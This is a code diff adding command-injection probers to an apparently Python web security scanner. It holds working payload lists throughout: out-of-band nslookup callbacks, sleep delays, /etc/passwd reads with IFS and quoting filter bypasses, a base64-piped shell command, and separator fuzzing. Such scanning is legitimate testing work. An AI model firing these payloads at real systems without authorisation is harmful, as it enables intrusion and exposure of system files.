@@ -18,6 +18,7 @@ import logging
 import re
 import time
 from typing import Any, Callable, Dict, List, Optional, Tuple
+import urllib.parse
 from urllib.parse import parse_qsl, urlparse, urlencode, urlunparse
 
 import requests as _requests
@@ -101,6 +102,17 @@ class CmdiScanner(BaseScanner):
 
         # --- Adım 5: RCE chain — komut çıktısını raporla -----------------
         self._run_rce_chain(urls)
+
+        # --- Advanced probers (OOB, time-based, filter bypass, separator) -
+        ctx = kwargs.get("ctx") or self.results
+        oast_domain = (ctx or {}).get("oast_domain") if isinstance(ctx, dict) else None
+        for url in urls:
+            CMDiOOBDNSProber(session=self.session, results=self.results, debug=self.debug).run(
+                url, oast_domain=oast_domain
+            )
+            CMDiTimeBasedProber(session=self.session, results=self.results, debug=self.debug).run(url)
+            CMDiFilterBypassProber(session=self.session, results=self.results, debug=self.debug).run(url)
+            CMDiCommandSeparatorFuzzer(session=self.session, results=self.results, debug=self.debug).run(url)
 
     def _run_rce_chain(self, urls: List[str]) -> None:
         """
@@ -420,6 +432,362 @@ class CmdiScanner(BaseScanner):
             f"[CMDi/OOB] Payloads sent for token={token} — "
             f"OAST poller will report any DNS callbacks asynchronously."
         )
+
+
+# ---------------------------------------------------------------------------
+# Advanced Probers — OOB/DNS, Time-Based, Filter Bypass, Separator Fuzz
+# ---------------------------------------------------------------------------
+
+class CMDiOOBDNSProber(BaseScanner):
+    """
+    OOB (Out-of-Band) DNS callback prober for blind CMDI detection.
+    Uses an OAST domain when provided; falls back to a canary placeholder.
+    Single Responsibility: DNS-callback injection only.
+    """
+
+    name = "cmdi_oob_dns"
+
+    def run(self, target: str, **kwargs) -> None:
+        oast_domain = kwargs.get("oast_domain") or (self.results or {}).get("oast_domain")
+        canary_domain = oast_domain if oast_domain else "burpcollaborator.net"
+        severity = "Critical" if oast_domain else "High"
+
+        parsed = urlparse(target)
+        params = parse_qsl(parsed.query)
+        if not params:
+            return
+
+        for param_name, _ in params:
+            import random as _rnd, string as _str
+            token = "".join(_rnd.choices(_str.ascii_lowercase, k=6))
+            probe_host = f"{token}.{canary_domain}" if oast_domain else canary_domain
+
+            oob_payloads = [
+                (f"; nslookup {probe_host}",          "unix_nslookup_semicolon"),
+                (f"| nslookup {probe_host}",          "unix_nslookup_pipe"),
+                (f"`nslookup {probe_host}`",           "unix_nslookup_backtick"),
+                (f"$(nslookup {probe_host})",         "unix_nslookup_subshell"),
+                (f"; ping -c 1 {probe_host}",         "unix_ping_semicolon"),
+                (f"& ping -n 1 {probe_host}",         "windows_ping_amp"),
+            ]
+
+            for payload, technique in oob_payloads:
+                encoded_payload = urllib.parse.quote(payload, safe="")
+                new_qs = [(p, v + payload if p == param_name else v) for p, v in params]
+                t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
+                try:
+                    self.session.get(t_url, timeout=REQUEST_TIMEOUT)
+                except Exception:
+                    pass
+
+                # Also try URL-encoded variant
+                new_qs_enc = [(p, v + encoded_payload if p == param_name else v) for p, v in params]
+                t_url_enc = urlunparse(parsed._replace(query=urlencode(new_qs_enc)))
+                try:
+                    self.session.get(t_url_enc, timeout=REQUEST_TIMEOUT)
+                except Exception:
+                    pass
+
+            # Check OAST poller for immediate callback
+            if oast_domain:
+                try:
+                    from websecure.core.oast import get_global_poller
+                    poller = get_global_poller()
+                    if poller:
+                        for cb in list(getattr(poller, "_callbacks_received", [])):
+                            if token in str(cb):
+                                self.report_finding(
+                                    vuln_type="OS Command Injection (OOB/DNS Confirmed)",
+                                    url=target,
+                                    param=param_name,
+                                    payload=f"; nslookup {probe_host}",
+                                    severity="Critical",
+                                    evidence=(
+                                        f"OOB DNS callback received for token={token}: "
+                                        f"{str(cb)[:200]}"
+                                    ),
+                                )
+                                return
+                except Exception as exc:
+                    logger.debug(f"[CMDiOOBDNSProber] OAST poller check failed: {exc!r}")
+
+            # Report with appropriate severity — Critical if real OOB, High for placeholder
+            evidence_msg = (
+                f"OOB DNS payloads sent to {probe_host} (token={token}). "
+                "Verify DNS callbacks in your OAST/Burp Collaborator panel."
+                if not oast_domain else
+                f"OOB DNS payload sent to {probe_host} (token={token}). "
+                "OAST poller will report confirmed callbacks asynchronously."
+            )
+            self.report_finding(
+                vuln_type="OS Command Injection (OOB/DNS Probe)",
+                url=target,
+                param=param_name,
+                payload=f"; nslookup {probe_host}",
+                severity=severity,
+                evidence=evidence_msg,
+            )
+
+
+class CMDiTimeBasedProber(BaseScanner):
+    """
+    Time-based blind CMDI prober.
+    Measures baseline response time, then injects delay payloads and checks
+    for significant response time increase. Cross-validates with multiple requests.
+    Single Responsibility: time-based delay detection only.
+    """
+
+    name = "cmdi_time"
+    _SLEEP_SECONDS = 7
+    _THRESHOLD_EXTRA = 5.0  # seconds above baseline to flag
+    _VERIFY_N = 3
+    _VERIFY_MIN_HITS = 2
+
+    _TIME_PAYLOADS: List[Tuple[str, str]] = [
+        ("; sleep 7",                  "unix_sleep_semicolon"),
+        ("| sleep 7",                  "unix_sleep_pipe"),
+        ("$(sleep 7)",                 "unix_sleep_subshell"),
+        ("& timeout /t 7",             "windows_timeout_amp"),
+        ("; ping -c 7 127.0.0.1",      "unix_ping_loopback"),
+    ]
+
+    def run(self, target: str, **kwargs) -> None:
+        parsed = urlparse(target)
+        params = parse_qsl(parsed.query)
+        if not params:
+            return
+
+        t0 = time.time()
+        baseline_resp = self.fetch_baseline(target, timeout=15)
+        if not baseline_resp:
+            return
+        baseline_time = time.time() - t0
+        time_threshold = baseline_time + self._THRESHOLD_EXTRA
+
+        for param_name, _ in params:
+            for payload, technique in self._TIME_PAYLOADS:
+                for encoded_payload in self._encoding_variants(payload):
+                    new_qs = [(p, v + encoded_payload if p == param_name else v) for p, v in params]
+                    t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
+                    t_start = time.time()
+                    try:
+                        self.session.get(t_url, timeout=REQUEST_TIMEOUT + 10)
+                        elapsed = time.time() - t_start
+                    except _requests.exceptions.Timeout:
+                        elapsed = REQUEST_TIMEOUT + 10
+                    except _requests.exceptions.RequestException:
+                        continue
+
+                    if elapsed > time_threshold:
+                        # Cross-validate: repeat to rule out network jitter
+                        if self._verify_time_based(
+                            parsed, params, param_name, encoded_payload, time_threshold
+                        ):
+                            self.report_finding(
+                                vuln_type="OS Command Injection (Time-Based Blind)",
+                                url=target,
+                                param=param_name,
+                                payload=encoded_payload,
+                                severity="Critical",
+                                evidence=(
+                                    f"Time-based confirmed: {elapsed:.2f}s elapsed "
+                                    f"> threshold {time_threshold:.2f}s "
+                                    f"(baseline={baseline_time:.2f}s, technique={technique})"
+                                ),
+                            )
+                            break
+                else:
+                    continue
+                break
+
+    @staticmethod
+    def _encoding_variants(payload: str) -> List[str]:
+        """Return plain, URL-encoded, and double-URL-encoded variants."""
+        encoded = urllib.parse.quote(payload, safe="")
+        double_encoded = urllib.parse.quote(encoded, safe="")
+        return [payload, encoded, double_encoded]
+
+    def _verify_time_based(
+        self,
+        parsed,
+        params: list,
+        param_name: str,
+        payload: str,
+        time_threshold: float,
+    ) -> bool:
+        hits = 0
+        for _ in range(self._VERIFY_N):
+            new_qs = [(p, v + payload if p == param_name else v) for p, v in params]
+            t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
+            t_start = time.time()
+            try:
+                self.session.get(t_url, timeout=time_threshold + 8)
+                if time.time() - t_start > time_threshold:
+                    hits += 1
+            except _requests.exceptions.Timeout:
+                hits += 1
+            except _requests.exceptions.RequestException:
+                pass
+            if hits >= self._VERIFY_MIN_HITS:
+                return True
+        return False
+
+
+class CMDiFilterBypassProber(BaseScanner):
+    """
+    CMDI filter/WAF bypass prober using IFS tricks, base64 decode,
+    string concatenation, and command separator fuzzing.
+    Single Responsibility: filter-bypass injection only.
+    """
+
+    name = "cmdi_filter_bypass"
+
+    _BYPASS_PAYLOADS: List[Tuple[str, str]] = [
+        # IFS-based space bypass
+        ("cat${IFS}/etc/passwd",                   "ifs_curly"),
+        ("cat$IFS/etc/passwd",                     "ifs_dollar"),
+        ("cat${IFS}${IFS}/etc/passwd",             "ifs_double_curly"),
+        # Env var tricks
+        (";echo ${PATH}",                          "env_path"),
+        (";echo ${HOME}",                          "env_home"),
+        # Base64-decoded command execution
+        (";echo d2hvYW1p|base64 -d|sh",            "base64_whoami"),
+        # String concatenation
+        (";c'a't /etc/passwd",                     "concat_single_quote"),
+        (';c"a"t /etc/passwd',                     "concat_double_quote"),
+        # Separator variants
+        (";id",                                    "separator_semicolon"),
+        ("|id",                                    "separator_pipe"),
+        ("||id",                                   "separator_or"),
+        ("&&id",                                   "separator_and"),
+        ("%0aid",                                  "separator_newline"),
+        ("%0d%0aid",                               "separator_crlf"),
+        ("`id`",                                   "separator_backtick"),
+        ("$(id)",                                  "separator_subshell"),
+    ]
+
+    _SUCCESS_PATTERNS: List[Tuple[str, str]] = [
+        (r"root:.*:0:0:",             "Critical"),
+        (r"nobody:.*:65534:",         "Critical"),
+        (r"uid=\d+\(",                "Critical"),
+        (r"(?i)(gid=\d+)",            "Critical"),
+        (r"(?i)command not found",    "Medium"),   # reveals command structure
+        (r"(?i)syntax error",         "Medium"),   # reveals shell error
+        (r"(?i)sh: \d+:",             "Medium"),   # shell line error
+    ]
+
+    def run(self, target: str, **kwargs) -> None:
+        parsed = urlparse(target)
+        params = parse_qsl(parsed.query)
+        if not params:
+            return
+
+        baseline_resp = self.fetch_baseline(target, timeout=10)
+        baseline_text = (baseline_resp.text or "") if baseline_resp else ""
+
+        for param_name, _ in params:
+            for payload, technique in self._BYPASS_PAYLOADS:
+                new_qs = [(p, v + payload if p == param_name else v) for p, v in params]
+                t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
+                try:
+                    resp = self.session.get(t_url, timeout=REQUEST_TIMEOUT)
+                    text = resp.text or ""
+                except _requests.exceptions.RequestException:
+                    continue
+
+                for pattern, sev in self._SUCCESS_PATTERNS:
+                    if re.search(pattern, text, re.I | re.S) and not re.search(
+                        pattern, baseline_text, re.I | re.S
+                    ):
+                        self.report_finding(
+                            vuln_type="OS Command Injection (Filter Bypass)",
+                            url=target,
+                            param=param_name,
+                            payload=payload,
+                            severity=sev,
+                            evidence=(
+                                f"Filter bypass confirmed via technique={technique}. "
+                                f"Pattern matched: {pattern}"
+                            ),
+                        )
+                        break
+
+
+class CMDiCommandSeparatorFuzzer(BaseScanner):
+    """
+    Command separator fuzzer — tests classic, URL-encoded, double-encoded,
+    and Windows CMD separator variants for every parameter.
+    Single Responsibility: separator injection surface only.
+    """
+
+    name = "cmdi_separator"
+
+    _SEPARATOR_PAYLOADS: List[Tuple[str, str]] = [
+        # Unix plain
+        ("; id",         "unix_semicolon"),
+        ("| id",         "unix_pipe"),
+        ("|| id",        "unix_or"),
+        ("&& id",        "unix_and"),
+        ("& id",         "unix_amp"),
+        # URL-encoded
+        ("%3B id",       "url_enc_semicolon"),
+        ("%7C id",       "url_enc_pipe"),
+        ("%0a id",       "url_enc_newline"),
+        # Double-encoded
+        ("%253B id",     "dbl_enc_semicolon"),
+        ("%257C id",     "dbl_enc_pipe"),
+        # Windows CMD
+        ("& whoami",     "win_amp_whoami"),
+        ("| whoami",     "win_pipe_whoami"),
+        ("&& whoami",    "win_and_whoami"),
+    ]
+
+    _WIN_INDICATORS = ["SYSTEM", "NT AUTHORITY", "DESKTOP-", "WIN-"]
+
+    _SUCCESS_PATTERNS: List[Tuple[str, str]] = [
+        (r"uid=\d+\(",                             "Critical"),
+        (r"(?i)\broot\b",                          "Critical"),
+        (r"(?i)www-data",                          "Critical"),
+        (r"(?i)SYSTEM",                            "Critical"),
+        (r"(?i)NT AUTHORITY",                      "Critical"),
+    ]
+
+    def run(self, target: str, **kwargs) -> None:
+        parsed = urlparse(target)
+        params = parse_qsl(parsed.query)
+        if not params:
+            return
+
+        baseline_resp = self.fetch_baseline(target, timeout=10)
+        baseline_text = (baseline_resp.text or "") if baseline_resp else ""
+
+        for param_name, original_value in params:
+            for payload, technique in self._SEPARATOR_PAYLOADS:
+                injected_value = original_value + payload
+                new_qs = [(p, injected_value if p == param_name else v) for p, v in params]
+                t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
+                try:
+                    resp = self.session.get(t_url, timeout=REQUEST_TIMEOUT)
+                    text = resp.text or ""
+                except _requests.exceptions.RequestException:
+                    continue
+
+                for pattern, sev in self._SUCCESS_PATTERNS:
+                    if re.search(pattern, text, re.I | re.S) and not re.search(
+                        pattern, baseline_text, re.I | re.S
+                    ):
+                        self.report_finding(
+                            vuln_type="OS Command Injection (Separator Fuzz)",
+                            url=target,
+                            param=param_name,
+                            payload=payload,
+                            severity=sev,
+                            evidence=(
+                                f"Command separator '{technique}' confirmed. "
+                                f"Pattern matched: {pattern}"
+                            ),
+                        )
+                        break
 
 
 # ---------------------------------------------------------------------------
